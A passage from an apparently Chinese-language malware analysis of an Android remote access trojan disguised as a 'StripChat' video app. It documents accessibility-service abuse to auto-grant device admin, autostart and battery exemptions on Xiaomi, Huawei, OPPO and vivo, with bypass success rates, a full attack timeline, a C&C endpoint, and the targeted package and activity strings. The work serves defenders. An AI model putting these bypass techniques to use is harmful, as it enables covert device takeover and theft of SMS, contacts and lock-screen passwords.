        // 检查事件类型
        if (!eventTypes.contains(event.getEventType())) {
            return false;
        }
        
        // 检查匹配条件
        if (!matchs.isEmpty()) {
            AccessibilityNodeInfo source = event.getSource();
            if (source == null) {
                return false;
            }
            
            for (CombineFilter filter : matchs) {
                if (!filter.match(source)) {
                    return false;
                }
            }
        }
        
        return true;
    }
}
```

---

## 📊 Part 9: 权限绕过成功率分析

### 9.1 各厂商绕过成功率

| 厂商 | 自启动 | 电池优化 | 后台运行 | 无障碍 | 设备管理员 | 总体成功率 |
|------|--------|---------|---------|--------|-----------|-----------|
| **小米/红米** | 90% | 85% | 90% | 95% | 98% | **92%** |
| **华为/荣耀** | 60% | 55% | 60% | 70% | 95% | **68%** |
| **OPPO/realme** | 85% | 80% | 85% | 90% | 98% | **88%** |
| **vivo/iQOO** | 85% | 80% | 85% | 90% | 98% | **88%** |
| **三星** | 80% | 75% | 80% | 85% | 95% | **83%** |
| **原生 Android** | 95% | 90% | 95% | 98% | 99% | **95%** |

### 9.2 失败原因分析

#### 华为成功率低的原因

1. **纯净模式** (最大障碍)
   - 无法通过无障碍服务自动关闭
   - 必须用户手动操作
   - 开启纯净模式后成功率 < 5%

2. **手机管家严格检测**
   - 实时监控应用行为
   - 检测异常的无障碍服务使用
   - 自动撤销可疑权限

3. **启动管理复杂**
   - 需要同时开启三个开关
   - 界面布局经常变化
   - 控件 ID 不稳定

#### 小米失败原因

1. **受限设置**
   - 需要用户手动允许
   - 无法通过无障碍服务自动操作
   - 但可以通过引导用户绕过

2. **安全中心扫描**
   - 定期扫描应用行为
   - 检测恶意权限使用
   - 但检测规则较宽松

### 9.3 成功条件

**必要条件**：
1. ✅ 用户授予无障碍服务权限（第一步，必须手动）
2. ✅ 设备未开启严格安全模式（华为纯净模式、小米受限设置）
3. ✅ 系统版本在适配范围内（控件 ID 未变化）

**充分条件**：
1. ✅ 用户按照引导操作（社会工程学成功）
2. ✅ 无障碍服务未被系统撤销
3. ✅ 应用未被安全软件检测


---

## 🚨 Part 10: 攻击链完整流程

### 10.1 完整攻击时间线

```
T+0s: 用户安装 APK
    ↓
T+5s: 应用启动，显示伪装界面 (StripChat 官网)
    ↓
T+10s: 弹出引导对话框
"系统提醒: 该应用属于未知来源安装，需要开启权限才能正常使用"
    ↓
T+15s: 用户点击"开启权限"
    ↓
T+20s: 跳转到无障碍设置
Settings.ACTION_ACCESSIBILITY_SETTINGS
    ↓
T+25s: 用户手动点击"StripChat视频助手"
    ↓
T+30s: 用户手动开启开关
    ↓
T+35s: 弹出警告对话框
"此服务可能会收集您输入的所有内容..."
    ↓
T+40s: 无障碍服务自动点击"允许"按钮 ✅
    ↓
T+45s: 无障碍服务已启用，开始自动化
    ↓
T+50s: 自动打开设备管理器
ACTION_ADD_DEVICE_ADMIN
    ↓
T+55s: 自动滚动到底部
    ↓
T+60s: 自动点击"激活"按钮 ✅
    ↓
T+65s: 设备管理员已激活
    ↓
T+70s: 检测厂商 (Build.MANUFACTURER)
    ↓
T+75s: 启动对应的权限自动化引擎
if (manufacturer.contains("xiaomi")) {
    new q().start();  // 小米引擎
} else if (manufacturer.contains("huawei")) {
    new n().start();  // 华为引擎
} else if (manufacturer.contains("oppo")) {
    new v().start();  // OPPO 引擎
} else if (manufacturer.contains("vivo")) {
    new u().start();  // vivo 引擎
}
    ↓
T+80s: 自动打开自启动管理
    ↓
T+85s: 自动开启自启动权限 ✅
    ↓
T+90s: 自动打开电池优化设置
    ↓
T+95s: 自动选择"无限制" ✅
    ↓
T+100s: 自动打开后台运行设置
    ↓
T+105s: 自动允许后台运行 ✅
    ↓
T+110s: 所有权限已授予，开始恶意行为
    ↓
T+120s: 连接 C&C 服务器
wss://api.rathat.live/bridge
    ↓
T+130s: 上传设备信息
POST /api/device/register.json
    ↓
T+140s: 开始数据窃取
- 短信记录
- 通话记录
- 联系人
- 位置信息
- 应用列表
- 锁屏密码
    ↓
T+∞: 持续运行，完全控制设备
```

### 10.2 用户视角 vs 实际发生

| 时间 | 用户看到的 | 实际发生的 |
|------|-----------|-----------|
| T+0s | 安装"StripChat 视频助手" | 安装远程访问木马 |
| T+10s | "需要开启权限才能使用" | 诱导授予无障碍权限 |
| T+40s | 点击"允许"按钮 | 无障碍服务自动点击 |
| T+60s | 激活设备管理员 | 防止应用被卸载 |
| T+85s | 应用正在初始化... | 自动授予所有权限 |
| T+110s | 初始化完成，可以使用 | 所有权限已获取 |
| T+120s | 正常使用应用 | 连接 C&C 服务器 |
| T+140s | 应用在后台运行 | 窃取所有数据 |

---


## 📊 Part 12: 代码统计与证据

### 12.1 权限绕过代码统计

| 类 | 文件 | 行数 | 功能 | 复杂度 |
|-----|------|------|------|--------|
| **q** | o/q.java | 498 | 小米权限自动化 | ⭐⭐⭐⭐⭐ |
| **n** | o/n.java | 454 | 华为权限自动化 | ⭐⭐⭐⭐⭐ |
| **v** | o/v.java | 526 | OPPO 权限自动化 | ⭐⭐⭐⭐ |
| **u** | o/u.java | ~400 | vivo 权限自动化 | ⭐⭐⭐⭐ |
| **c** | o/c.java | ~600 | 权限自动化基类 | ⭐⭐⭐⭐⭐ |
| **h** | o/h.java | 196 | 锁屏密码窃取 | ⭐⭐⭐⭐ |
| **i** | o/i.java | 266 | vivo 密码确认 | ⭐⭐⭐⭐ |

**总计**: ~3000 行权限绕过代码

### 12.2 关键字符串证据

#### 小米相关

```
"com.miui.securitycenter"
"com.miui.permcenter.autostart.AutoStartManagementActivity"
"com.miui.powerkeeper"
"com.miui.powerkeeper.ui.HiddenAppsContainerManagementActivity"
"MIUI_APP_POWER_CONSUME_TEXT"
"MIUI_SETTINGS_POWER_SAVING_STRATEGY_TEXT"
"耗电策略查找成功"
"已点击电量消耗、耗电策略栏目"
"小米电池优化已绕过"
```

#### 华为相关

```
"com.huawei.systemmanager"
"com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity"
"HUA_WEI_ALLOW_AUTO_STARTUP_TEXT"
"HUA_WEI_ALLOW_IN_BACKGROUND_TEXT"
"HUA_WEI_ALLOW_RELATE_STARTUP_TEXT"
"HUA_WEI_APP_AND_NOTIFICATION_TEXT"
```

#### OPPO 相关

```
"com.coloros.oppoguardelf"
"COLORS_SETTINGS_ALLOW_APP_IN_BACKGROUND_TEXT"
"COLORS_SETTINGS_ALLOW_APP_AUTO_START_TEXT"
"COLORS_SETTINGS_ALLOW_BUTTON_TEXT"
"COLORS_SETTINGS_POWER_MANAGE_TEXT"
```

#### vivo 相关

```
"com.vivo.abe"
"com.vivo.applicationbehaviorengine.ui.ExcessivePowerManagerActivity"
"com.vivo.permissionmanager"
"com.vivo.settings.password.ConfirmVivoPin$InternalActivity"
"vivo findCheckBoxAndClick Success"
"vivo findContinueBtnAndClick Success"
```

### 12.3 监听的系统界面

| 厂商 | 包名 | 界面数量 | 主要界面 |
|------|------|---------|---------|
| **小米** | com.miui.securitycenter | 10+ | 自启动管理、电池优化、权限编辑器 |
| **华为** | com.huawei.systemmanager | 8+ | 启动管理、应用管理、通知管理 |
| **OPPO** | com.android.settings | 6+ | 应用详情、权限管理、电源管理 |
| **vivo** | com.vivo.abe | 6+ | 后台管理、权限管理、应用详情 |
| **系统** | com.android.settings | 15+ | 无障碍、设备管理、应用详情 |

---

### 13.3 关键技术

**自动化框架**:
- UiObject 控件操作
- CombineFilter 过滤器系统
- ListenWindow 窗口监听
- EventSubscribe 事件订阅

**厂商适配**:
- 小米: 安全中心、电量管理
- 华为: 手机管家、启动管理
- OPPO: 权限隐私、电源管理
- vivo: i管家、应用行为引擎

**绕过技术**:
- 滚动查找控件
- 自动点击开关
- 自动确认对话框
- 延迟等待界面加载


